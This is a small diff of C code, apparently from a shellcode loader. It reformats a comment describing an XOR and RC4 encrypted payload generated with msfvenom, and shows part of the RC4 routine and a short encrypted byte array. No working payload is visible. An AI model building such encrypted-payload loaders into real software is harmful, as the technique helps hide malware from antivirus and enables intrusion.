@@ -66,8 +66,14 @@ void rc4_crypt(uint8_t *S, uint8_t *data, size_t datalen) {
         data[k] ^= K;
     }
 }
-// XOR 10i + RC4 encypted payload
-// Generate with msfvenom
+
+/*
+ ****
+ XOR 10i + RC4 encypted payload
+ Generate with msfvenom
+ ****
+*/
+
 unsigned char encrypted[] = 
 "\x98\x48\x18\xa9\xb7\x4a\x3c\x33\x28\xcb\xbb\x02\xab\xa3";  
 size_t encrypted_len = sizeof(encrypted) - 1;
